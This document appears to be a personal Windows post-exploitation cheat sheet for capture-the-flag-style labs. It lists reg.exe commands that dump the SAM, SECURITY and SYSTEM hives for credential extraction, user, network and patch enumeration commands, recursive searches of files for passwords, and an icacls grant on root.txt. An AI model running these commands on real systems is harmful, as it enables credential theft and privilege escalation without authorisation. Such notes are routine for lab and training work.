# **basic commands**

hostname && type proof.txt && ipconfig /all  
  
  
  
  
C:\> reg.exe save hklm\sam c:\windows\temp\sam.save  
C:\> reg.exe save hklm\security c:\windows\temp\security.save  
C:\> reg.exe save hklm\system c:\windows\temp\system.save  
  
# Basics  
systeminfo  
hostname  
  
# Who am I?  
whoami  
echo %username%  
  
# What users/localgroups are on the machine?  
net users  
net localgroups  
  
# More info about a specific user. Check if user has privileges.  
net user user1  
  
# View Domain Groups  
net group /domain  
  
# View Members of Domain Group  
net group /domain <Group Name>  
  
# Firewall  
netsh firewall show state  
netsh firewall show config  
  
# Network  
ipconfig /all  
route print  
arp -A  
  
# How well patched is the system?  
wmic qfe get Caption,Description,HotFixID,InstalledOn  
  
#

### Search for them

  
  
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
  
#Find all those strings in config files.  
dir /s *pass* == *cred* == *vnc* == *.config*  
  
# Find all passwords in all files.  
findstr /spin "password" *.*  
findstr /spin "password" *.*  
  
icacls root.txt /grant alfred:F